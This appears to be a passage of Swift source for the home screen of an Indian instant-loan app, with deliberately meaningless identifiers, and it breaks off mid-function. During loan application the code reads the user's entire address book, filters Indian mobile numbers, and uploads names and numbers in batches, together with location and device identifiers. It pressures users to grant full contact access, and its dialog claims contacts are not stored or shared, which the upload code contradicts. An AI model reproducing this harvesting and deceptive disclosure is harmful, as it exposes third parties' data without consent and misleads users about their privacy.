import AddressBook
import Contacts
import CoreLocation
import Kingfisher
import SwiftUI
import UIKit

struct RpproachPain {
    var productIds: String
    var loanAmounts: String
    var loanTerms: String
}

struct DuneHomePlaceView: View {
    @Binding var driftStripHidden: Bool
    @Binding var reedStoneTipBusy: Bool
    @EnvironmentObject private var tideAuth: TideAuthOak
    private let duneWideCap: CGFloat = 560

    @State private var reedStoneLane = ReedStoneLane()
    @State private var tideShell: TideSuphomeShell?
    @State private var mossBusy = false
    @State private var mossDeviceSent = false
    @State private var reedAdidDone = false
    @State private var reedAdidLoop = false
    @State private var reedAdidTick = UUID()
    @State private var dossManoidPick: DossManoidPick?
    @State private var reedKycGate = false
    @State private var reedWaveGate = false
    @State private var reedStoneFlow = false
    @State private var reedPopupChainRunning = false
    @State private var reedPopupChainWaitingStoneDismiss = false
    @State private var reedPopupChainWaitingWithdrawDismiss = false
    
    @State private var reedStoneAfterApply = false
    @State private var reedFernPane = false
    @State private var challenges = false

    private var reedJungleKyc: Bool {
        tideShell?.mossStatus == 10
    }

    private var robotswe: String {
        switch tideShell?.mossStatus {
        case 10, 20, 80, 51, 100:
            return "APPLY"
        case 81:
            return "Pay Overdue"
        case 41:
            return "Modify bank account"
        case 32:
            return "Get loan"
        case 30:
            return "Submit Application"
        default:
            return ""
        }
    }
    
    @State private var kraine: String = ""
    
    @State private var hieve: Int = 0
    @State private var battlefie: String = ""
    
    private var reedPromptArrowVisible: Bool {
        guard let u = tideShell?.mossStatus else { return false }
        switch u {
        case 10, 80, 81, 41, 30, 32, 51:
            return true
        default:
            return false
        }
    }

    var body: some View {
        NavigationView {
            ZStack(alignment: .top) {
                LinearGradient(
                    colors: [Color(red: 87 / 255, green: 12 / 255, blue: 146 / 255), Color(red: 68 / 255, green: 8 / 255, blue: 116 / 255)],
                    startPoint: .top,
                    endPoint: .bottom
                )
                .ignoresSafeArea()

                Image("l2_bg")
                    .resizable()
                    .aspectRatio(375 / 341, contentMode: .fit)
                    .frame(maxWidth: .infinity)
                    .ignoresSafeArea(edges: .top)
                    .allowsHitTesting(false)

                ScrollView(.vertical, showsIndicators: false) {
                    VStack(alignment: .leading, spacing: 0) {
                        reedPromptTapArea
                        reedExcellentCard
                            .padding(.horizontal, 20)
                            .padding(.top, 18)
                        reedKycApplyColumn
                    }
                    .padding(.bottom, 120)
                    .frame(maxWidth: duneWideCap)
                    .frame(maxWidth: .infinity)
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity, alignment: .top)
                .onReceive(NotificationCenter.default.publisher(for: .duneReefRefresh)) { _ in
                    DispatchQueue.main.asyncAfter(deadline: .now() + .milliseconds(300)) {
                        reedRefreshHome()
                    }
                }
                .onReceive(NotificationCenter.default.publisher(for: .reedWaveVersionGone)) { _ in
                    reedContinuePopupChainAfterVersionGone()
                }
                .onReceive(NotificationCenter.default.publisher(for: .reedAdjustReady)) { _ in
                    reedTryStartAdidLoop()
                }
                
                NavigationLink(
                    destination: FernCoralPane(),
                    isActive: $reedFernPane
                ) {
                    EmptyView()
                }
                .frame(width: 0, height: 0)
                .hidden()
                
                NavigationLink(isActive: $challenges) {
                    FrontlineBitiouView(humanoid: hieve, robots: battlefie)
                } label: {
                    EmptyView()
                }
                .frame(width: 0, height: 0)
                .hidden()
            }
            .navigationBarHidden(true)
        }
        .navigationViewStyle(StackNavigationViewStyle())
        .fullScreenCover(item: $dossManoidPick, onDismiss: {
            ReedDriftStripGate.shared.mossPop(&driftStripHidden)
            DispatchQueue.main.asyncAfter(deadline: .now() + .milliseconds(300)) {
                reedRefreshHome()
            }
        }) { pick in
            PearlWedHazePane(
                tideURL: pick.url,
                shellKycId: pick.shellKycId,
                shellProductId: pick.shellProductId,
                widely: pick.widely,
                shellFogSlice: pick.shellFogSlice
            )
        }
        .onChange(of: reedFernPane) { v in
            if v {
                ReedDriftStripGate.shared.mossPush(&driftStripHidden)
            } else {
                ReedDriftStripGate.shared.mossPop(&driftStripHidden)
            }
        }
        .onChange(of: challenges) { v in
            if v {
                ReedDriftStripGate.shared.mossPush(&driftStripHidden)
            } else {
                ReedDriftStripGate.shared.mossPop(&driftStripHidden)
            }
        }
        .onAppear {
            if !mossDeviceSent {
                mossDeviceSent = true
                reedPostRegisterDevice()
            }
            reedTryStartAdidLoop()
            reedRefreshHome()
        }
    }

    private func reedShowWithdrawDialog(fromChain: Bool = false) {
        CedarCommonDialog.driftShow(
            reedTitle: "To be withdrawn shortly",
            tideBody: "You have a pending withdrawal order that requires your confirmation. Upon confirmation, we will transfer the funds to your bank account immediately.",
            mistAlign: .center,
            sandLeft: "Cancel",
            sandRight: "Withdraw",
            leftTap: {
                CedarCommonDialog.driftDismiss()
                DispatchQueue.main.async {
                    if fromChain {
                        reedPopupChainWaitingWithdrawDismiss = false
                        reedQueueBridgeLoading {
                            reedPopupChainRunning = false
                        }
                    }
                }
            },
            rightTap: {
                CedarCommonDialog.driftDismiss()
                if fromChain {
                    reedPopupChainRunning = false
                    reedPopupChainWaitingWithdrawDismiss = false
                }
                guard let raw = tideShell?.mossDust?.trimmingCharacters(in: .whitespacesAndNewlines), !raw.isEmpty else { return }
                
                let fog = FogReedShell(driftLineA: raw, driftLineB: nil, driftLineC: "1")
                ReedDriftStripGate.shared.mossPush(&driftStripHidden)
                dossManoidPick = DossManoidPick(url: URL(string: "https://page.kunalresources.com/dist/order/index.html")!, shellFogSlice: fog)
            }
        )
    }

    private enum CreekStoneSlice {
        static let canvas: CGFloat = 375
        
        static let barOuterW: CGFloat = 191.6999969482422
        static let barH: CGFloat = 54
        
        static let illusInsetX: CGFloat = 101.14522074315755
        
        static let illusGapBelowBar: CGFloat = 15
        
        static let barTopGap: CGFloat = 64
    }

    private var reedPromptTapArea: some View {
        Button(action: { reedTapPrompt() }) {
            VStack(alignment: .leading, spacing: 10) {
                Text(tideShell?.mossCopy ?? "")
                    .font(SlateRiverFont.reed(14, .medium))
                    .foregroundStyle(Color.white)
                    .multilineTextAlignment(.leading)
                    .lineSpacing(2)
                    .frame(maxWidth: .infinity, alignment: .leading)

                if reedPromptArrowVisible {
                    Image("coralHazePill")
                        .resizable()
                        .scaledToFill()
                        .frame(width: 70, height: 32)
                        .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
                }
            }
        }
        .buttonStyle(.plain)
        .padding(.horizontal, 22)
        .padding(.top, 20)
    }

    private var reedKycApplyColumn: some View {
        
        ZStack {
            VStack(spacing: 10) {
                HStack(alignment: .center, spacing: 5) {
                    Image(._2Thumbup5).hidden()
                    Text("Maximum Loan Amount")
                        .font(SlateRiverFont.reed(14, .bold))
                    Image(._2Thumbup5)
                }
                .padding(.top, 10)
                Text(kraine)
                    .foregroundStyle(Color(red: 71/255.0, green: 10/255.0, blue: 119/255.0))
                    .font(SlateRiverFont.reed(40, .bold))
                HStack(spacing: 20, content: {
                    Text("0.08%/Day")
                        .foregroundStyle(Color(red: 71/255.0, green: 10/255.0, blue: 119/255.0))
                        .font(SlateRiverFont.reed(13, .medium))
                    Text("150 Days")
                        .foregroundStyle(Color(red: 71/255.0, green: 10/255.0, blue: 119/255.0))
                        .font(SlateRiverFont.reed(13, .medium))
                })
                .padding(.bottom, 45)
            }
            .frame(maxWidth: .infinity)
            .background(
                LinearGradient(colors: [Color(red: 141 / 255, green: 255 / 255, blue: 248 / 255), Color(red: 68 / 255, green: 255 / 255, blue: 244 / 255)], startPoint: .top, endPoint: .bottom),
                in: RoundedRectangle(cornerRadius: 24)
            )
            .padding(.horizontal, 20)
            .padding(.top, 16)
            .overlay(alignment: .bottom) {
                Button(action: { stuffOfScience() }) {
                    ZStack {
                        Image("jadeMintStripe")
                            .scaledToFill()
                        Text(robotswe)
                            .font(SlateRiverFont.reed(16, .bold))
                            .foregroundStyle(Color(red: 71 / 255, green: 10 / 255, blue: 119 / 255))
                    }
                }
                .frame(height: 54)
                .buttonStyle(.plain)
                .offset(y: 27)
            }
        }
    }

    @ViewBuilder
    private func reedLogoView(_ urlString: String?) -> some View {
        let s = urlString?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
        if let u = URL(string: s), !s.isEmpty {
            KFImage(u)
                .placeholder {
                    ProgressView().tint(.white)
                }
                .onFailure { _ in }
                .resizable()
                .scaledToFill()
            .clipShape(RoundedRectangle(cornerRadius: 8, style: .continuous))
        } else {
            RoundedRectangle(cornerRadius: 6, style: .continuous)
                .fill(Color.white.opacity(0.12))
        }
    }

    private var reedExcellentCard: some View {
        Button(action: { reedFernPane = true }) {
            Image("ivyOakPanel")
                .resizable()
                .scaledToFit()
                .frame(maxWidth: .infinity)
        }
        .buttonStyle(.plain)
    }

    private func reedPostRegisterDevice() {
        ReedFernCevimceBody.reedClayTag { cevimce in
            MeadowRelay.shared.runPine(.fernQuartz(cevimce), sandType: EmptyShell.self) { _ in }
        }
    }

    private func reedTryStartAdidLoop() {
        guard !reedAdidDone, !reedAdidLoop else { return }
        guard FrostReedGate.shared.reedAdjustReady() else { return }
        reedAdidLoop = true
        reedRunAdidLoop(tick: reedAdidTick)
    }

    private func reedRunAdidLoop(tick: UUID) {
        guard !reedAdidDone else {
            reedAdidLoop = false
            return
        }
        guard tick == reedAdidTick else { return }
        FrostReedGate.shared.reedFetchAdjustAdid { line in
            DispatchQueue.main.async {
                guard tick == reedAdidTick else { return }
                guard !reedAdidDone else {
                    reedAdidLoop = false
                    return
                }
                let fog = line?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
                guard !fog.isEmpty else {
                    reedScheduleAdidRetry(tick: tick)
                    return
                }
                let dune = ReedStoneUserBody(duneAdid: fog)
                MeadowRelay.shared.runPine(.stoneUser(dune), sandType: TideUserInfoShell.self) { res in
                    DispatchQueue.main.async {
                        guard tick == reedAdidTick else { return }
                        if case .success = res {
                            reedAdidDone = true
                            reedAdidLoop = false
                            
                        } else {
                            reedScheduleAdidRetry(tick: tick)
                        }
                    }
                }
            }
        }
    }

    private func reedScheduleAdidRetry(tick: UUID) {
        guard !reedAdidDone else {
            reedAdidLoop = false
            return
        }
        guard tick == reedAdidTick else { return }
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            guard tick == reedAdidTick else { return }
            reedRunAdidLoop(tick: tick)
        }
    }

    private func reedRefreshHome(showLoadingHUD: Bool = true) {
        guard !mossBusy else { return }
        mossBusy = true
        if showLoadingHUD {
            JuniperFogHUD.oakWait("Loading...")
        }
        MeadowRelay.shared.runPine(.jadeBay(ReedFernCinerBody()), sandType: TideSuphomeShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case let .success(env):
                    
                    if showLoadingHUD {
                        JuniperFogHUD.oakDismiss()
                    }
                    
                    tideShell = env.tideData
                    
                    aidcrewed()
                    
                    let us = env.tideData?.mossStatus
                    if us == 10 {
                        if showLoadingHUD {
                            JuniperFogHUD.oakDismiss()
                        }
                        mossBusy = false
                        reedRunPopupChainAfterWaveReady {
                            reedStartHomePopupQueue()
                        }
                        return
                    }
                    let grp = DispatchGroup()
                    grp.enter()
                    mossBusy = false
                    reedRunPopupChainAfterWaveReady {
                        reedStartHomePopupQueue()
                        grp.leave()
                    }
                    grp.notify(queue: .main) {
                        self.reedTryKycReturnAutoOrderIfNeeded()
                    }
                case let .failure(err):
                    if showLoadingHUD {
                        JuniperFogHUD.oakDismiss()
                        JuniperFogHUD.oakBad(err.fogReedLine)
                    }
                    mossBusy = false
                }
                
            }
        }
        
    }

    func aidcrewed() -> Void {
        let Formatter = NumberFormatter()
        Formatter.numberStyle = .decimal
        Formatter.locale = Locale(identifier: "en_IN")
        Formatter.maximumFractionDigits = 0
        Formatter.minimumFractionDigits = 0
        guard let out = Formatter.string(from: (NSNumber(value: tideShell?.mossMix ?? 0))) else {
            kraine = ""
            return
        }
        kraine = "₹\(out)"
    }
    
    private func reedRunPopupChainAfterWaveReady(retryLeft: Int = 30, action: @escaping () -> Void) {
        let state = ReedWaveGate.reedState
        if state == 2 || state == 4 {
            action()
            return
        }
        if state == 5 {
            return
        }
        if state == 0 || state == 1 || state == 3 {
            guard retryLeft > 0 else { return }
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                reedRunPopupChainAfterWaveReady(retryLeft: retryLeft - 1, action: action)
            }
            return
        }
    }

    private func reedStartHomePopupQueue() {
        guard !reedPopupChainRunning else { return }
        guard AmberReefDialogHost.shared.reefShell == nil else { return }
        reedPopupChainRunning = true
        if reedJungleKyc {
            reedQueueBridgeLoading {
                reedPopupChainRunning = false
            }
            return
        }
        reedQueueBridgeLoading {
            if tideShell?.mossStatus == 32 {
                reedPopupChainWaitingWithdrawDismiss = true
                reedShowWithdrawDialog(fromChain: true)
                return
            }
        }
    }

    private func reedHandleStoneDismissInQueue() {
        if reedPopupChainWaitingStoneDismiss {
            reedPopupChainWaitingStoneDismiss = false
            reedFinishHomePopupQueueAfterStone()
            return
        }
        reedStartHomePopupQueue()
    }

    private func reedFinishHomePopupQueueAfterStone() {
        reedQueueBridgeLoading {
            reedPopupChainRunning = false
        }
    }

    private func reedQueueBridgeLoading(delay: TimeInterval = 0.25, action: @escaping () -> Void) {
        JuniperFogHUD.oakWait(nil, ivyBlock: true)
        DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
            JuniperFogHUD.oakDismiss()
            guard AmberReefDialogHost.shared.reefShell == nil else { return }
            action()
        }
    }

    private func reedSuphomeAutoMossEligible() -> Bool {
        guard let s = tideShell else { return false }
        guard s.mossHas == 0 else { return false }
        guard s.mossStatus == 20 else { return false }
        return s.mossOption == "system"
    }

    private func reedTryKycReturnAutoOrderIfNeeded() {
        guard DuringAcrossFrom.diagnosed else { return }
        DuringAcrossFrom.diagnosed = false
        guard reedSuphomeAutoMossEligible() else { return }
        self.betanPlateau()
    }
    
    private func betanPlateau() -> Void {
        JuniperFogHUD.oakWait("Loading...")
        MeadowRelay.shared.runPine(.dernisin(EmptyShell()), sandType: MilitaryDrones.self) { result in
            DispatchQueue.main.async {
                switch result {
                case let .success(army):
                    JuniperFogHUD.oakDismiss()
                    if let array = army.tideData?.productInfoList {
                        
                        var array1: [String] = []
                        var array2: [String] = []
                        var array3: [String] = []
                        
                        for earl in array.enumerated() {
                            
                            array1.append(earl.element.productId)
                            
                            let a = earl.element.productTermV3Response.amountDetailList.max { obj1, obj2 in
                                obj1.loanAmount.compare(obj2.loanAmount, options: .numeric) == .orderedAscending
                            }
                            
                            guard let survival = a else { return }
                            
                            array2.append(survival.loanAmount)
                            
                            let b = survival.termDetailList.max { obj1, obj2 in
                                obj1.loanTerm < obj2.loanTerm
                            }
                            
                            guard let tumour = b else { return }
                            
                            array3.append("\(tumour.loanTerm)")
                        }
                        
                        guard !array1.isEmpty, !array2.isEmpty, !array3.isEmpty else {
                            return
                        }
                        
                        let rpproPain = RpproachPain(productIds: array1.joined(separator: ","), loanAmounts: array2.joined(separator: ","), loanTerms: array3.joined(separator: ","))
                        reedTapStoneApply(rpproPain)
                        
                    }
                    
                case .failure(_):
                    JuniperFogHUD.oakDismiss()
                    break
                }
            }
        }
        
    }

    private func reedTapPrompt() {
        guard let s = tideShell else { return }
        guard let u = s.mossStatus else { return }
        if u == 10 {
            reedStartKycFlow()
            return
        }
        if u == 80 || u == 81 {
            UserDefaults.standard.set(20, forKey: "reef.oakOrderFilter")
            UserDefaults.standard.synchronize()
            NotificationCenter.default.post(name: .coralReefTabPick, object: 2)
            return
        }
        if u == 41 || u == 30 || u == 32 {
            UserDefaults.standard.set(10, forKey: "reef.oakOrderFilter")
            UserDefaults.standard.synchronize()
            NotificationCenter.default.post(name: .coralReefTabPick, object: 2)
        }
        if u == 51 {
            JuniperFogHUD.oakWait("Loading...")
            MeadowRelay.shared.runPine(.quietLake(EmptyShell()), sandType: CoralAppConfigShell.self) { res in
                DispatchQueue.main.async {
                    JuniperFogHUD.oakDismiss()
                    switch res {
                    case .success(let data):
                        guard let onth = data.tideData?.ivyDynamic?.rejectH5, !onth.isEmpty, let url = URL(string: onth) else {
                            return
                        }
                        ReedDriftStripGate.shared.mossPush(&driftStripHidden)
                        dossManoidPick = DossManoidPick(url: url, widely: true)
                    case .failure(_):
                        break
                    }
                }
            }
        }
    }

    private func reedStartKycFlow() {
        guard !reedKycGate else { return }
        reedKycGate = true
        JuniperFogHUD.oakWait("Loading...")
        MeadowRelay.shared.runPine(.riverVault(EmptyShell()), sandType: LichenKycVaultShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case let .success(env):
                    JuniperFogHUD.oakDismiss()
                    let rows = env.tideData?.reefMossList ?? []
                    guard let kid = rows.driftPendingShellId() else {
                        reedKycGate = false
                        reedRefreshHome()
                        return
                    }
                    reedKycGate = false
                    ReedDriftStripGate.shared.mossPush(&driftStripHidden)
                    dossManoidPick = DossManoidPick(url: URL(string: "https://page.kunalresources.com/dist/kyc/index.html")!, shellKycId: kid)
                case let .failure(err):
                    JuniperFogHUD.oakDismiss()
                    reedKycGate = false
                    JuniperFogHUD.oakBad(err.fogReedLine)
                }
            }
        }
    }
    
    private func stuffOfScience() {
        
        if tideShell?.mossStatus == 10 {
            
        } else {
            
            if reedSuphomeAutoMossEligible() {
                self.betanPlateau()
                return
            }
        }
        
        switch tideShell?.mossStatus {
        case 10:
            reedStartKycFlow()
        case 20, 80, 51, 100:
            IncreasinTembState.shared.showOverlay = true
            IncreasinTembState.shared.fedorovRmer = { mykhailo in
                switch mykhailo {
                case .MykhailoNone:
                    hieve = 0
                    battlefie = ""
                    challenges = true
                case .MykhailoMore:
                    ReedDriftStripGate.shared.mossPush(&driftStripHidden)
                    dossManoidPick = DossManoidPick(url: URL(string: "https://page.kunalresources.com/dist/product/index.html")!)
                case .MykhailoGo:
                    cancerNow()
                case .MykhailoOtherGo:
                    hieve = tideShell?.mossStatus ?? 0
                    battlefie = tideShell?.mossCopy ?? ""
                    challenges = true
                }
            }
        case 81:
            UserDefaults.standard.set(20, forKey: "reef.oakOrderFilter")
            UserDefaults.standard.synchronize()
            NotificationCenter.default.post(name: .coralReefTabPick, object: 2)
        case 41, 32, 30:
            UserDefaults.standard.set(10, forKey: "reef.oakOrderFilter")
            UserDefaults.standard.synchronize()
            NotificationCenter.default.post(name: .coralReefTabPick, object: 2)
        default:
            break
        }
    }
    
    private func cancerNow() {
        JuniperFogHUD.oakWait("Loading...")
        MeadowRelay.shared.runPine(.quietLake(EmptyShell()), sandType: CoralAppConfigShell.self) { res in
            DispatchQueue.main.async {
                JuniperFogHUD.oakDismiss()
                switch res {
                case .success(let data):
                    guard let onth = data.tideData?.ivyDynamic?.rejectH5, !onth.isEmpty, let url = URL(string: onth) else {
                        hieve = 0
                        battlefie = ""
                        challenges = true
                        return
                    }
                    ReedDriftStripGate.shared.mossPush(&driftStripHidden)
                    dossManoidPick = DossManoidPick(url: url, widely: true)
                case .failure(_):
                    break
                }
            }
        }
    }
    
    private func reedContinuePopupChainAfterVersionGone(retryLeft: Int = 6) {
        if AmberReefDialogHost.shared.reefShell != nil {
            guard retryLeft > 0 else { return }
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                reedContinuePopupChainAfterVersionGone(retryLeft: retryLeft - 1)
            }
            return
        }
        reedStartHomePopupQueue()
    }

    private func reedTapStoneApply(_ pain: RpproachPain) {
        guard !reedStoneFlow else { return }
        JuniperFogHUD.oakWait("Loading...")
        reedStoneAfterApply = false
        reedStoneFlow = true
        MeadowRelay.shared.runPine(.quietLake(EmptyShell()), sandType: CoralAppConfigShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case let .success(env):
                    guard let config = env.tideData else {
                        self.reedStoneStopFlow(message: "Data unavailable")
                        return
                    }
                    self.reedStoneStartApply(pain, config: config)
                case let .failure(err):
                    self.reedStoneStopFlow(message: err.fogReedLine)
                }
            }
        }
    }

    private func reedStoneStartApply(_ pain: RpproachPain, config: CoralAppConfigShell) {
        let need = config.driftLeafContact != 0
        reedStoneLane.reedAsk(needLocation: need) { result in
            DispatchQueue.main.async {
                switch result {
                case let .reedPoint(lon, lat):
                    self.reedStoneSubmitOrder(pain, config: config, longitude: lon, latitude: lat)
                case .reedFallback:
                    self.reedStoneSubmitOrder(pain, config: config, longitude: "-360", latitude: "-360")
                case let .reedStop(showDialog):
                    JuniperFogHUD.oakDismiss()
                    self.reedStoneFlow = false
                    if showDialog {
                        Self.reedStoneShowPositionSecondDialog()
                    }
                }
            }
        }
    }

    private func reedStoneSubmitOrder(_ pain: RpproachPain, config: CoralAppConfigShell, longitude: String, latitude: String) {
        
        let risksfor = ReedStoneApplyBody(productIds: pain.productIds, loanAmounts: pain.loanAmounts, loanTerms: pain.loanTerms, longitude: longitude, latitude: latitude, imei: "null", serialNo: OliveDeviceTag.shared.reedPebbleLine)
        
        MeadowRelay.shared.runPine(.stoneApply(risksfor), sandType: SpitalProcedures.self) { res in
            DispatchQueue.main.async {
                switch res {
                case let .success(env):
                    self.reedStoneAfterApply = true
                    
                    let array = env.tideData?.list.map { obj in
                        obj.orderId
                    }
                    
                    let pds = array?.joined(separator: ",") ?? ""
                    
                    guard let mossLine = array?.first, !pds.isEmpty else {
                        self.reedStoneStopFlow(message: "Data unavailable")
                        return
                    }
                    self.reedStoneUploadDevice(mossLine: mossLine, config: config, pds: pds)
                case let .failure(err):
                    self.reedStoneStopFlow(message: err.fogReedLine)
                }
            }
        }
    }

    private func reedStoneUploadDevice(mossLine: String, config: CoralAppConfigShell, pds: String) {
        ReedFernCevimceBody.reedClayTag { cevimce in
            let body = ReedFernOrdeviceBody(duneOrder: mossLine, duneBody: cevimce)
            MeadowRelay.shared.runPine(.fernStone(body), sandType: EmptyShell.self) { res in
                DispatchQueue.main.async {
                    switch res {
                    case .success:
                        self.reedStoneHandleContact(mossLine: mossLine, config: config, pds: pds)
                    case let .failure(err):
                        self.reedStoneStopFlow(message: err.fogReedLine)
                    }
                }
            }
        }
    }

    private func reedStoneHandleContact(mossLine: String, config: CoralAppConfigShell, kada: Bool = false, pds: String) {
        let needContact = config.driftLeafContact != 0
        let status = CNContactStore.authorizationStatus(for: .contacts)
        switch status {
        case .authorized:
            RiverBuryDrift.shared.reedTap("19")
            reedStoneUploadContact(mossLine: mossLine, config: config, allow: "", pds: pds)
        case .limited:
            RiverBuryDrift.shared.reedTap("198")
            if needContact {
                JuniperFogHUD.oakDismiss()
                let refreshAfter = reedStoneAfterApply
                reedStoneFlow = false
                reedStoneAfterApply = false
                if refreshAfter {
                    reedRefreshHome(showLoadingHUD: false)
                }
                
                if kada {
                    
                } else {
                    Self.reedStoneShowContactSecondDialog()
                }
                
            } else {
                reedStoneNotifyReady(mossLine: mossLine, config: config, allow: "3", pds: pds)
            }
        case .notDetermined:
            CNContactStore().requestAccess(for: .contacts) { ok, _ in
                DispatchQueue.main.async {
                    
                    reedStoneHandleContact(mossLine: mossLine, config: config, kada: true, pds: pds)

                }
            }
        case .denied, .restricted:
            RiverBuryDrift.shared.reedTap("20")
            if needContact {
                JuniperFogHUD.oakDismiss()
                let refreshAfter = reedStoneAfterApply
                reedStoneFlow = false
                reedStoneAfterApply = false
                if refreshAfter {
                    reedRefreshHome(showLoadingHUD: false)
                }
                if kada {
                    
                } else {
                    Self.reedStoneShowContactSecondDialog()
                }
            } else {
                reedStoneNotifyReady(mossLine: mossLine, config: config, allow: "2", pds: pds)
            }
        @unknown default:
            reedStoneStopFlow(message: "Request failed")
        }
    }

    private func reedStoneUploadContact(mossLine: String, config: CoralAppConfigShell, allow: String?, pds: String) {
        let rows = reedStoneCollectContacts(maxCount: config.driftLeafMax)
        if rows.isEmpty {
            reedStoneNotifyReady(mossLine: mossLine, config: config, allow: allow, pds: pds)
            return
        }
        let step = max(1, config.driftLeafStep)
        let groups = stride(from: 0, to: rows.count, by: step).map {
            Array(rows[$0 ..< min($0 + step, rows.count)])
        }
        let mintFog = DispatchGroup()
        var reedOK = true
        var reedLine: String?
        for part in groups {
            mintFog.enter()
            let body = ReedFernContactBody(duneOrder: mossLine, duneList: part)
            MeadowRelay.shared.runPine(.fernMist(body), sandType: EmptyShell.self) { res in
                DispatchQueue.main.async {
                    if case let .failure(err) = res {
                        reedOK = false
                        if reedLine == nil {
                            reedLine = err.fogReedLine
                        }
                    }
                    mintFog.leave()
                }
            }
        }
        mintFog.notify(queue: .main) {
            if reedOK {
                self.reedStoneNotifyReady(mossLine: mossLine, config: config, allow: allow, pds: pds)
            } else {
                self.reedStoneStopFlow(message: reedLine ?? "Request failed")
            }
        }
    }

    private func reedStoneNotifyReady(mossLine: String, config: CoralAppConfigShell, allow: String?, pds: String) {
        let body = ReedFernReadyBody(duneOrder: mossLine, duneLeaf: allow)
        MeadowRelay.shared.runPine(.fernWave(body), sandType: EmptyShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case .success:
                    self.reedStoneOpenSuccess(pds: pds, config: config)
                case let .failure(err):
                    self.reedStoneStopFlow(message: err.fogReedLine)
                }
            }
        }
    }

    private func reedStoneOpenSuccess(pds: String, config: CoralAppConfigShell) {
        
        reedPopupChainRunning = false
        reedPopupChainWaitingStoneDismiss = false
        reedPopupChainWaitingWithdrawDismiss = false
        
        JuniperFogHUD.oakDismiss()
        reedStoneFlow = false
        if let url = URL(string: "https://page.kunalresources.com/dist/successful/index.html") {
            reedStoneAfterApply = false
            ReedDriftStripGate.shared.mossPush(&driftStripHidden)
            dossManoidPick = DossManoidPick(
                url: url,
                shellFogSlice: FogReedShell(driftLineA: nil, driftLineB: nil, driftLineC: nil, driftLineD: pds)
            )
        }
    }

    private func reedStoneStopFlow(message: String) {
        JuniperFogHUD.oakDismiss()
        reedStoneFlow = false
        let refreshAfter = reedStoneAfterApply
        reedStoneAfterApply = false
        JuniperFogHUD.oakBad(message)
        if refreshAfter {
            reedRefreshHome(showLoadingHUD: false)
        }
    }

    private func reedStoneCollectContacts(maxCount: Int) -> [ReedFernContactLeaf] {
        var err: Unmanaged<CFError>?
        guard let book = ABAddressBookCreateWithOptions(nil, &err)?.takeRetainedValue() else {
            return []
        }
        guard let list = ABAddressBookCopyArrayOfAllPeople(book)?.takeRetainedValue() as? [ABRecord] else {
            return []
        }
        var rows: [ReedFernContactLeaf] = []
        var done = Set<String>()
        for p in list {
            let first = (ABRecordCopyValue(p, kABPersonFirstNameProperty)?.takeRetainedValue() as? String) ?? ""
            let last = (ABRecordCopyValue(p, kABPersonLastNameProperty)?.takeRetainedValue() as? String) ?? ""
            let nick = (ABRecordCopyValue(p, kABPersonNicknameProperty)?.takeRetainedValue() as? String) ?? ""
            let name = "\(first) \(last)".trimmingCharacters(in: .whitespacesAndNewlines)
            let useName = name.isEmpty ? nick.trimmingCharacters(in: .whitespacesAndNewlines) : name
            let mod = ABRecordCopyValue(p, kABPersonModificationDateProperty)?.takeRetainedValue() as? Date
            let ms = mod.map { String(Int($0.timeIntervalSince1970 * 1000)) } ?? ""
            guard let phoneAny = ABRecordCopyValue(p, kABPersonPhoneProperty)?.takeRetainedValue() else {
                continue
            }
            let phones = phoneAny as ABMultiValue
            let count = ABMultiValueGetCount(phones)
            if count <= 0 { continue }
            for i in 0 ..< count {
                guard let rawAny = ABMultiValueCopyValueAtIndex(phones, i)?.takeRetainedValue() else { continue }
                let raw = rawAny as? String ?? ""
                let only = Self.reedStoneDigitsOnly(raw)
                let normalized = Self.reedStoneFixPhone(only)
                guard Self.reedStoneMatchPhone(normalized) else { continue }
                guard !done.contains(normalized) else { continue }
                done.insert(normalized)
                rows.append(ReedFernContactLeaf(contactName: useName, contactPhone: normalized, contactUpdateTime: ms))
                if maxCount > 0, rows.count >= maxCount {
                    return rows
                }
            }
        }
        return rows
    }

    private static func reedStoneDigitsOnly(_ line: String) -> String {
        line.unicodeScalars.filter { CharacterSet.decimalDigits.contains($0) }.map(String.init).joined()
    }

    private static func reedStoneFixPhone(_ line: String) -> String {
        if line.count == 13, line.hasPrefix("910") {
            return String(line.dropFirst(3))
        }
        if line.count == 12, line.hasPrefix("91") {
            return String(line.dropFirst(2))
        }
        if line.count == 11, line.hasPrefix("0") {
            return String(line.dropFirst(1))
        }
        return line
    }

    private static func reedStoneMatchPhone(_ line: String) -> Bool {
        let pat = "^(91[6-9]\\d{9}|[6-9]\\d{9}|0[6-9]\\d{9}|910[6-9]\\d{9})$"
        return line.range(of: pat, options: .regularExpression) != nil
    }

    private static func reedStoneShowPositionSecondDialog() {
        let appName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String
            ?? "App"
        let tideBody = "Please grant \(appName) location access in Settings so you can finish your loan application."
        CedarCommonDialog.driftShow(
            reedTitle: nil,
            tideBody: tideBody,
            mistAlign: .center,
            sandLeft: "Cancel",
            sandRight: "Confirm",
            leftTap: {
                CedarCommonDialog.driftDismiss()
            },
            rightTap: {
                CedarCommonDialog.driftDismiss()
                if let u = URL(string: UIApplication.openSettingsURLString) {
                    UIApplication.shared.open(u, options: [:], completionHandler: nil)
                }
            }
        )
    }

    private static func reedStoneShowContactSecondDialog() {
        let appName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String
            ?? "App"
        let text = "\(appName) requires access to your contacts to ensure the security of your account and prevent fraudulent activity. It seems you currently have not allowed us to access them. You can turn on this permission in your device's Settings. Please open Settings → Click on '\(appName)' → authorize 'Contacts'. Please be sure to select the \"Allow Full Access\" option; otherwise, it may affect the outcome of your review. We place great importance on your privacy and will not store or share your contact information."
        CedarCommonDialog.driftShow(
            reedTitle: nil,
            tideBody: text,
            mistAlign: .center,
            sandLeft: "Cancel",
            sandRight: "Confirm",
            leftTap: {
                CedarCommonDialog.driftDismiss()
            },
            rightTap: {
